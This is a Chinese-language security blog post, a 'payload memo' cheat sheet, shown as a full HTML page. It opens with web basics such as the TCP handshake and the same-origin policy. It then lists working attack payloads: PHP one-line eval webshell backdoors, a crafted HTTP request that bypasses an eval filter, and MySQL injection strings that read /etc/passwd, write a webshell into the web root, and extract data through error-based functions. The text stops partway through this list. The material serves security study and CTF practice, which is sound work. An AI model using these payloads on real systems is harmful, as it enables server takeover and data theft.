<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="web,">










<meta name="description" content="春节在家，闲来无事总结一下常规或者不常规的操作，部分内容转自大师傅们的博客，侵删，不定期更新 web基础TCP/IP 五层模型应用层–传输层–网络层–数据链路层–物理层 TCP三次握手所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换">
<meta name="keywords" content="web">
<meta property="og:type" content="article">
<meta property="og:title" content="payload备忘">
<meta property="og:url" content="http://yoursite.com/2020/01/25/web-cheat-sheet/index.html">
<meta property="og:site_name" content="Moyu&#39;s blog">
<meta property="og:description" content="春节在家，闲来无事总结一下常规或者不常规的操作，部分内容转自大师傅们的博客，侵删，不定期更新 web基础TCP/IP 五层模型应用层–传输层–网络层–数据链路层–物理层 TCP三次握手所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2020-01-29T03:50:25.098Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="payload备忘">
<meta name="twitter:description" content="春节在家，闲来无事总结一下常规或者不常规的操作，部分内容转自大师傅们的博客，侵删，不定期更新 web基础TCP/IP 五层模型应用层–传输层–网络层–数据链路层–物理层 TCP三次握手所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/01/25/web-cheat-sheet/">





  <title>payload备忘 | Moyu's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Moyu's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/web-cheat-sheet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Moyu">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/wlp.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyu's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">payload备忘</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-25T11:24:57+08:00">
                2020-01-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  18.6k
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>春节在家，闲来无事总结一下常规或者不常规的操作，部分内容转自大师傅们的博客，侵删，不定期更新</p>
<h2 id="web基础"><a href="#web基础" class="headerlink" title="web基础"></a>web基础</h2><h3 id="TCP-IP-五层模型"><a href="#TCP-IP-五层模型" class="headerlink" title="TCP/IP 五层模型"></a>TCP/IP 五层模型</h3><p>应用层–传输层–网络层–数据链路层–物理层</p>
<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。</p>
<p>三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换 TCP 窗口大小信息。在 socket 编程中，客户端执行 <code>connect()</code> 时。将触发三次握手。</p>
<ul>
<li><p>第一次握手(SYN=1, seq=x):</p>
<p>客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号(Sequence Number)字段里。</p>
<p>发送完毕后，客户端进入 <code>SYN_SEND</code> 状态。</p>
</li>
<li><p>第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1):</p>
<p>服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 加1，即X+1。 发送完毕后，服务器端进入 <code>SYN_RCVD</code> 状态。</p>
</li>
<li><p>第三次握手(ACK=1，ACKnum=y+1)</p>
<p>客户端再次发送确认包(ACK)，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1</p>
<p>发送完毕后，客户端进入 <code>ESTABLISHED</code> 状态，当服务器端接收到这个包时，也进入 <code>ESTABLISHED</code> 状态，TCP 握手结束。</p>
</li>
</ul>
<h3 id="http基础及相关攻击"><a href="#http基础及相关攻击" class="headerlink" title="http基础及相关攻击"></a>http基础及相关攻击</h3><p>状态码：200 302 400 401 403 404 500</p>
<p>请求方式：1.0 get post head 1.1新增：put delete connect options trace patch</p>
<p>http1.1 分块绕waf</p>
<p>请求走私： <a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</a> </p>
<h3 id="web-相关组件介绍"><a href="#web-相关组件介绍" class="headerlink" title="web 相关组件介绍"></a>web 相关组件介绍</h3><p> <a href="https://hellohxk.com/blog/web-component/" target="_blank" rel="noopener">https://hellohxk.com/blog/web-component/</a> </p>
<h3 id="跨域相关"><a href="#跨域相关" class="headerlink" title="跨域相关"></a>跨域相关</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>同协议，同端口，同域名</p>
<p> 同源策略有两种限制，第一种是限制了不同源之间的请求交互，例如在使用XMLHttpRequest 或 fetch 函数时则会受到同源策略的约束。 第二个限制是浏览器中不同源的框架之间是不能进行js的交互操作的。比如通过iframe和window.open产生的不同源的窗口。这两种限制都有不同的解决方案。</p>
<p> 对于<code>&lt;a&gt; &lt;script&gt; &lt;img&gt; &lt;video&gt; &lt;link&gt;</code>这类属性带有src,href的标签，允许跨域加载 </p>
<h4 id="跨域数据传输方式"><a href="#跨域数据传输方式" class="headerlink" title="跨域数据传输方式"></a>跨域数据传输方式</h4><h5 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h5><p>此方法针对的是同源策略的第二个限制，即不同窗口之间的同源限制。且此方法只能影响顶级域名相同子域名不同之间的同源规则。</p>
<p>不同子域名之间默认不同源(如aaa.evoa.me与bbb.evoa.me)，但是可以通过设置document.domain为相同的更高级域名，来使不同子域同源。</p>
<ul>
<li>document.domain 只可以被设置为他的当前域或其当前域的父域 </li>
<li>document.domain 的赋值操作会导致端口号被重写为NULL，所以 aaa.evoa.me 仅设置document.domain为evoa.me 并不能与evoa.me进行通信，evoa.me的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患 </li>
<li>设置document.domain并不会影响XMLHttpRequest 或 fetch的同源策略。</li>
</ul>
<h5 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h5><p>window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
<p>举个例子，页面有个iframe，iframe中的页面为A，无论iframe中的页面A地址怎么更改，这个iframe对象都是共享同一个window.name，A页面设置window.name，再将iframe的src设置为B页面，B页面中的JS脚本可以读取到之前A页面设置的window.name，简而言之，window.name几乎不受同源策略的影响</p>
<p> 所以，永远不要把敏感数据存在window.name中，否则敏感数据可以被任何其他网页的JS脚本获取 </p>
<h5 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h5><p> 由于此跨域方法比较麻烦且无比较直接的安全问题，此处不细讲 </p>
<h5 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h5><p><strong>window.postMessage()</strong> 方法可以安全地实现跨源通信，被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MessageEvent" target="_blank" rel="noopener"><code>MessageEvent</code></a> 消息。 该函数的第一个参数为发送的消息，第二个参数是匹配发送给的窗口的url地址(可以使用<code>*</code>，代表无限制通配)，若目标url和此参数不匹配，消息就不会被发送。</p>
<p>被接受窗口则可以通过监听message事件来获取接受信息</p>
<p> 如果事件监听没有判断事件的来源，则会有很大的安全隐患 </p>
<h5 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h5><p> 上面讲过<code>&lt;script&gt;</code>标签可以跨域加载资源，但是返回内容如果不符合JS语法同样无法获取数据，JSONP则是通过返回符合JS语法的数据内容使资源能够跨域加载 </p>
<p>它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。</p>
<p>JSONP的基本语法为：callback({“name”:”alan”, “msg”:”success”})</p>
<p>参考链接： <a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">https://xz.aliyun.com/t/4470</a> </p>
<h3 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h3><p>nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- &lt;targer&gt;</span><br></pre></td></tr></table></figure>

<p>sqlmap</p>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>基本命令，运维相关</p>
<h2 id="OWASP-TOP-10-2017"><a href="#OWASP-TOP-10-2017" class="headerlink" title="OWASP TOP 10 2017"></a>OWASP TOP 10 2017</h2><ul>
<li>注入</li>
<li>失效的认证和会话管理</li>
<li>XSS</li>
<li>失效的访问控制</li>
<li>安全配置不当</li>
<li>敏感信息泄露</li>
<li>攻击防护不足</li>
<li>CSRF</li>
<li>使用已知漏洞组件</li>
<li>未受有效保护的API</li>
</ul>
<h2 id="PHP版本特性"><a href="#PHP版本特性" class="headerlink" title="PHP版本特性"></a>PHP版本特性</h2><h3 id="5-5-gt-5-6"><a href="#5-5-gt-5-6" class="headerlink" title="5.5 -&gt; 5.6"></a>5.5 -&gt; 5.6</h3><h4 id="使用表达式定义常量"><a href="#使用表达式定义常量" class="headerlink" title="使用表达式定义常量"></a>使用表达式定义常量</h4><p>在常量、属性声明和函数参数默认值声明时，以前版本只允许常量值，PHP5.6开始允许使用包含数字、字符串字面值和常量的标量表达式。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">const ONE = 1;</span><br><span class="line">const TWO = ONE * 2;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">    const THREE = TWO + 1;</span><br><span class="line">    const ONE_THIRD = ONE / self::THREE;</span><br><span class="line">    const SENTENCE = &apos;The value of THREE is &apos;.self::THREE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用-运算符定义变长参数函数"><a href="#使用-运算符定义变长参数函数" class="headerlink" title="使用 ... 运算符定义变长参数函数"></a>使用 <code>...</code> 运算符定义变长参数函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function f($req, $opt = null, ...$params) &#123;</span><br><span class="line">    // $params 是一个包含了剩余参数的数组</span><br><span class="line">    printf(&apos;$req: %d; $opt: %d; number of params: %d&apos;.&quot;\n&quot;,</span><br><span class="line">           $req, $opt, count($params));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(1);</span><br><span class="line">f(1, 2);</span><br></pre></td></tr></table></figure>

<p>漏洞代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$param = $_REQUEST[&apos;param&apos;];</span><br><span class="line">if(strlen($param)&lt;17 &amp;&amp; stripos($param,&apos;eval&apos;) === false &amp;&amp; stripos($param,&apos;assert&apos;) === false) &#123;</span><br><span class="line">  eval($param);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结合回调函数利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure>

<h4 id="使用-运算符进行参数展开"><a href="#使用-运算符进行参数展开" class="headerlink" title="使用 ... 运算符进行参数展开"></a>使用 <code>...</code> 运算符进行参数展开</h4><p> 在调用函数的时候，使用 … 运算符， 将 数组 和 可遍历 对象展开为函数参数。 在其他编程语言，比如 Ruby中，这被称为连接运算符。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function add($a, $b, $c) &#123;</span><br><span class="line">    return $a + $b + $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$operators = [2, 3];</span><br><span class="line">echo add(1, ...$operators);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="use-function-以及-use-const"><a href="#use-function-以及-use-const" class="headerlink" title="use function 以及 use const"></a>use function 以及 use const</h4><p> use 运算符 被进行了扩展以支持在类中导入外部的函数和常量。 对应的结构为 use function 和 use const。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Name\Space &#123;</span><br><span class="line">    const FOO = 42;</span><br><span class="line">    function f() &#123; echo __FUNCTION__.&quot;\n&quot;; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    use const Name\Space\FOO;</span><br><span class="line">    use function Name\Space\f;</span><br><span class="line"></span><br><span class="line">    echo FOO.&quot;\n&quot;;</span><br><span class="line">    f();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="5-6-gt-7"><a href="#5-6-gt-7" class="headerlink" title="5.6 -&gt; 7"></a>5.6 -&gt; 7</h3><h4 id="preg-replace-不再支持-e修饰符"><a href="#preg-replace-不再支持-e修饰符" class="headerlink" title="preg_replace()不再支持/e修饰符"></a>preg_replace()不再支持/e修饰符</h4><p>下边的这个后门就不能再用了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&quot;/.*/e&quot;,$_GET[&quot;h&quot;],&quot;.&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>但是7.0提供了新的函数，可以改改继续用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace_callback(&quot;/.*/&quot;,function ($a)&#123;@eval($a[0]);&#125;,$_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="create-function-被废弃"><a href="#create-function-被废弃" class="headerlink" title="create_function()被废弃"></a>create_function()被废弃</h4><p> 少了一种可以利用当后门的函数，实际上它是通过执行<code>eval</code>实现的。可有可无。 </p>
<h4 id="mysql-系列全员移除"><a href="#mysql-系列全员移除" class="headerlink" title="mysql_*系列全员移除"></a>mysql_*系列全员移除</h4><p>官方推荐的是mysqli或者pdo_mysql </p>
<h4 id="unserialize-增加一个可选白名单参数"><a href="#unserialize-增加一个可选白名单参数" class="headerlink" title="unserialize()增加一个可选白名单参数"></a>unserialize()增加一个可选白名单参数</h4><p>例如下面这种使用方法， 如果反序列数据里面的类名不在这个白名单内，就会报错 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = unserialize($serializedObj1 , [&quot;allowed_classes&quot; =&gt; true]);</span><br><span class="line">$data2 = unserialize($serializedObj2 , [&quot;allowed_classes&quot; =&gt; [&quot;MyClass1&quot;, &quot;MyClass2&quot;]]);</span><br></pre></td></tr></table></figure>

<h4 id="assert-默认不再可以执行代码"><a href="#assert-默认不再可以执行代码" class="headerlink" title="assert()默认不再可以执行代码"></a><strong>assert()</strong>默认不再可以执行代码</h4><p>导致一系列assert的后门无法利用</p>
<p>但是测试好像有些低版本7.x仍可以</p>
<h4 id="foreach不再改变内部数组指针"><a href="#foreach不再改变内部数组指针" class="headerlink" title="foreach不再改变内部数组指针"></a>foreach不再改变内部数组指针</h4><p>测试代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($a <span class="keyword">as</span> $k=&gt;&amp;$n)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="keyword">foreach</span> ($a <span class="keyword">as</span> $k=&gt;$n)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">print_r($a);</span><br></pre></td></tr></table></figure>

<p>5.6 运行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Array         </span><br><span class="line">(             </span><br><span class="line">    [0] =&gt; 1  </span><br><span class="line">    [1] =&gt; 2  </span><br><span class="line">    [2] =&gt; 3  </span><br><span class="line">)             </span><br><span class="line">Array         </span><br><span class="line">(             </span><br><span class="line">    [0] =&gt; 1  </span><br><span class="line">    [1] =&gt; 2  </span><br><span class="line">    [2] =&gt; 2  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p> 因为数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留，在第二个循环的时候实际上是对之前的指针不断的赋值。php7中通过值遍历时，操作的值为数组的副本，不在对后续操作进行影响。 </p>
<p>只影响7.0.0一个版本，之后又改回去了</p>
<h4 id="移除script标签"><a href="#移除script标签" class="headerlink" title="移除script标签"></a>移除script标签</h4><p>也就是说下面这种后门不能用了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[a])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="超大浮点数类型转换截断"><a href="#超大浮点数类型转换截断" class="headerlink" title="超大浮点数类型转换截断"></a>超大浮点数类型转换截断</h4><p>将浮点数转换为整数的时候，如果浮点数值太大，导致无法以整数表达的情况下， 在PHP5的版本中，转换会直接将整数截断，并不会引发错误。 在PHP7中，会报错。</p>
<h3 id="7-4-预加载绕过disable-function-（RCTF2019）"><a href="#7-4-预加载绕过disable-function-（RCTF2019）" class="headerlink" title="7.4 预加载绕过disable_function （RCTF2019）"></a>7.4 预加载绕过disable_function （RCTF2019）</h3><p>预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。</p>
<p>在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。</p>
<p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p>
<p>也就是说，通过PHP调用C的命令执行函数来绕过。</p>
<h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><p>注入的本质，是把用户输入数据作为代码执行。有两个关键条件：第一个是用户能控制输入；第二是原本程序要执行的代码，拼接了用户输入的数据，把数据当代码执行了。 </p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>查数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>

<p>查列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=tablename</span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(属性) from 库.表</span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>

<p>写文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;?php @eval($_POST[1]);?&gt; into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>floor</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</span><br><span class="line"># count(*)，floor，group by 三者缺一不可</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>

<p>extractvalue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and extractvalue(1,concat(0x3a,(select database()),0x3a))</span><br></pre></td></tr></table></figure>

<p>updatexml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and updatexml(1,concat(0x3a,(select database()),0x3a),1)</span><br></pre></td></tr></table></figure>

<p>geometrycollection</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<p>multipoint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<p>polygon</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<p>multipolygon</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<p>linestring</p>
